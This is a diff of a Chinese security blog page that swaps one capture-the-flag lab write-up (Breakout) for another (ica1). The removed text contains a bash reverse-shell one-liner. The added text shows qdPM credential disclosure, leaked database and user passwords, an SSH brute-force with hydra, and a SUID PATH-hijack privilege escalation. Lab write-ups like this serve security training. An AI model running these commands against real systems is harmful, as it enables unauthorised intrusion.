@@ -7,12 +7,12 @@ article: http://ogp.me/ns/article#">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="keywords" content="">
 
-<title>对02-Breakout的渗透测试 || woejk0x&#39;s blogs</title>
+<title>对ica1的渗透测试 || woejk0x&#39;s blogs</title>
 <link rel="icon" href="https://wo3jk.github.ioimages/wang.icon" type="image/x-icon">
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<meta property="og:title" content="对02-Breakout的渗透测试">
+<meta property="og:title" content="对ica1的渗透测试">
 <meta property="og:type" content="website">
-<meta property="og:url" content="https://wo3jk.github.io/2026/01/26/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:url" content="https://wo3jk.github.io/2026/01/29/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
 <meta property="og:image" content="">
 <meta property="og:site_name" content="woejk0x&#39;s blogs">
 <meta property="og:author" content="woejk0x">
@@ -20,7 +20,7 @@ article: http://ogp.me/ns/article#">
   
   
   
-  <meta name="description" content="信息收集主机发现1nmap192.168.59.1/24端口扫描1nmap-sV-p-192.168.59.143我们尝试去访问一下这些端口，尝试后有80和10000端口可以访问接着我们扫描一下敏感目录，使用命令：1dirsearch-u192.168.59.143整理后发现没有什么可以有用的信息，然后我们在">
+  <meta name="description" content="信息收集主机发现arp-scan-l端口扫描nmap-sV-p-192.168.59.148目录扫描dirsearch-u192.168.59.148Web渗透searchsploitqdPM9.2发现其泄露密码信息，搜索50176.txt文件位置并查阅该文件信息12locate50176.txtcat/us">
 
 
 <script src="/js/wang.js"></script>
@@ -125,10 +125,10 @@ article: http://ogp.me/ns/article#">
 </aside>
 <div class="post-container">
   <article class="post">
-    <h1 class="post-title">对02-Breakout的渗透测试</h1>
+    <h1 class="post-title">对ica1的渗透测试</h1>
 
     <div class="post-meta">
-      <span class="post-date">发布于 <time datetime="2026-01-26T05:30:00.000Z">2026-01-26</time></span>
+      <span class="post-date">发布于 <time datetime="2026-01-29T07:00:00.000Z">2026-01-29</time></span>
       
         <span class="post-categories">
           分类：<a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>, <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/">靶机日记</a>
@@ -136,24 +136,26 @@ article: http://ogp.me/ns/article#">
       
       
         <span class="post-updated">
-          最后更新于 <time datetime="2026-01-26T05:34:52.777Z">2026-01-26</time>
+          最后更新于 <time datetime="2026-01-29T06:56:48.351Z">2026-01-29</time>
         </span>
       
       <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
     </div>
     <div class="post-content">
-      <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.59.1/24</span><br></pre></td></tr></table></figure>
-<p><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126122935.png"></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- 192.168.59.143</span><br></pre></td></tr></table></figure>
-<p><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126124244.png"><br>我们尝试去访问一下这些端口，尝试后有80和10000端口可以访问<br>接着我们扫描一下敏感目录，使用命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.59.143</span><br></pre></td></tr></table></figure>
-<p><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126124945.png">整理后发现没有什么可以有用的信息，然后我们在80端口首页的源代码里面可以看到一个信息。这是一个​<strong>​Brainfuck加密后的信息。</strong><br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126125311.png"><br>我们尝试解密一下，可以看到是：<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126125545.png"><br><code>.2uqPEfj3D&lt;P&#39;a-3</code></p>
-<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>我们使用命令：<code>enum4linux 192.168.59.143</code>，可以看到成功扫描到一个用户cyber<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126125813.png"><br>我们来到之前找到的登录界面尝试登录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username &#x27;cyber&#x27;</span><br><span class="line">password &#x27;.2uqPEfj3D&lt;P&#x27;a-3&#x27;</span><br></pre></td></tr></table></figure>
-<p>登录成功后可以发现有一个命令行界面<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126130953.png"><br>然后我们查看文件，有一个user.txt里面就有一个flag<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126130913.png"></p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>我们输入命令查看权限，可以看到tar文件具有执行权限。<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126131138.png"><br>再查看一下有哪些文件，然后我们在&#x2F;var的文件夹下找到了一个文件<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126131403.png"><br>尝试去解压一下这个文件，可以获得一个密码。<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126131756.png"></p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>kali监听：<code>nc -lvvp 7777</code><br>执行命令：<code>bash -i &gt;&amp; /dev/tcp/192.168.59.128/7777 0&gt;&amp;1</code></p>
-<h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p>输入命令<code>su root</code> 然后输入之前获得的密码。<br>成功提权<br>第二个flag就在&#x2F;root下<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126132701.png"></p>
+      <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><code>arp-scan -l</code><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129110445.png"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><code>nmap -sV -p- 192.168.59.148</code><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129110524.png"></p>
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p><code>dirsearch -u 192.168.59.148</code><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129111909.png"></p>
+<h1 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h1><p><code>searchsploit qdPM 9.2</code><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129113058.png">发现其泄露密码信息，搜索50176.txt文件位置并查阅该文件信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">locate 50176.txt  </span><br><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/50176.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129120500.png"><br>发现数据库连接密码在databases.yml文件中<br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129132737.png"><br>发现数据库账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: qdpmadmin</span><br><span class="line">password: UcVQCMQk2STVeS6J</span><br></pre></td></tr></table></figure>
+<p>连接数据库<br><code>mysql -h 192.168.59.148 -u qdpmadmin -p --skip-ssl</code><br>查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use staff;</span><br><span class="line">show tables;</span><br><span class="line">select * from user;</span><br><span class="line">select * from login;</span><br><span class="line">select * from department;</span><br></pre></td></tr></table></figure>
+<p><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133402.png"><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133509.png"><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133531.png"><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133614.png"><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129133649.png"><br>将密码解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c3VSSkFkR3dMcDhkeTNyRg==          suRJAdGwLp8dy3rF</span><br><span class="line">N1p3VjRxdGc0MmNtVVhHWA==          7ZwV4qtg42cmUXGX</span><br><span class="line">WDdNUWtQM1cyOWZld0hkQw==          X7MQkP3W29fewHdC</span><br><span class="line">REpjZVZ5OThXMjhZN3dMZw==          DJceVy98W28Y7wLg</span><br><span class="line">Y3FObkJXQ0J5UzJEdUpTeQ==          cqNnBWCByS2DuJSy</span><br></pre></td></tr></table></figure>
+<p>写一个user.txt和password.txt,将账号和密码写进去<br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135318.png"><br><code>hydra -L user.txt -P password.txt 192.168.59.148 ssh</code><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135259.png"><br>使用travis账户登录<br><code>ssh travis@192.168.59.148</code><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135430.png"><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135520.png"><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129135706.png"><br>需要密码才能执行<code>sudo</code><br>切换dexter看看<br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129140013.png"><br>翻译一下：<br><strong>“在我看来，访问系统时存在一个弱点。据我所知，可执行文件的内容是部分可见的。我需要查明这是否构成了安全漏洞。”</strong><br><strong>如果你是在进行渗透测试或安全研究，也可以用更专业一点的措辞：</strong><br><strong>“我觉得系统的访问机制存在隐患。据我了解，可执行文件的内容可以被部分查看，我需要确认这其中是否存在漏洞。”</strong><br>翻译得知，可执行文件是可以查看的，需要查是否存在漏洞<br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129140351.png"><br>查看<code>/opt/get_access</code>文件内容<br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129140615.png"><br>文件内容是乱码的，使用strings工具打印出来<br><code>strings /opt/get_access</code><br><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129140751.png"><br>发现存在一个<code>cat /root/system.info</code>的行为，那么可以想到<strong>PATH 环境变量劫持</strong><br>原理：<br>当你在终端输入一个命令（如 cat）而没有写完整路径时，系统会根据 PATH 环境变量中定义的目录顺序去寻找这个可执行文件。<br>如果一个具有 <strong>SUID 权限</strong>（以 root 身份运行）的程序在内部调用了 cat 命令，但没有使用绝对路径（即写的是 cat 而不是 &#x2F;bin&#x2F;cat），那么我们就可以伪造一个 cat 程序来欺骗它。<br>伪造一个文件名为cat的可执行文件，文件内容为&#x2F;bin&#x2F;bash，并将文件路径设置为环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;/bin/bash&#x27; &gt; /tmp/cat</span><br><span class="line">chmod +x /tmp/cat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">/opt/get_access</span><br></pre></td></tr></table></figure>
+<p><img src="/%E5%AF%B9ica1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260129145427.png"></p>
 
     </div>
   </article>
@@ -168,11 +170,11 @@ article: http://ogp.me/ns/article#">
                     </div>
                     <div class="title">
                         <p>标题</p>
-                        <p>对02-Breakout的渗透测试</p>
+                        <p>对ica1的渗透测试</p>
                     </div>
                         <div class="publish">
                             <p>发布于</p>
-                            <p>2026-01-26</p>
+                            <p>2026-01-29</p>
                         </div>
                     <div class="ccbyncsa-icon">
                         <p>授权协议</p>
@@ -194,14 +196,9 @@ article: http://ogp.me/ns/article#">
     
       <div class="post-prev">
         <span class="nav-label">上一篇</span>
-        <a href="/2026/01/24/%E5%AF%B9napping-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">对napping-1.0.1的渗透测试</a>
+        <a href="/2026/01/28/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">对Thales的渗透测试</a>
       </div>
     
-    
-      <div class="post-next">
-        <span class="nav-label">下一篇</span>
-        <a href="/2026/01/27/%E5%AF%B901-Empire-Lupin-One%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">对01-Empire-Lupin-One的渗透测试</a>
-      </div>
     
   </nav>
   
@@ -276,14 +273,14 @@ article: http://ogp.me/ns/article#">
 
     </div>
     <div class="sidebar-bg">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">渗透测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.1.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">3.2.</span> <span class="toc-text">提权</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.</span> <span class="toc-text">目录扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">Web渗透</span></a></li></ol>
     </div>
     <div class="sidebar-bg">
         <div class="card-tags">
             
                 <a href="/tags/%E6%A8%A1%E6%8B%9F/" class="tag" aria-label="标签: #模拟">#模拟</a>
             
-                <a href="/tags/Easy/" class="tag" aria-label="标签: #Easy">#Easy</a>
+                <a href="/tags/Medium/" class="tag" aria-label="标签: #Medium">#Medium</a>
             
         </div>
     </div>
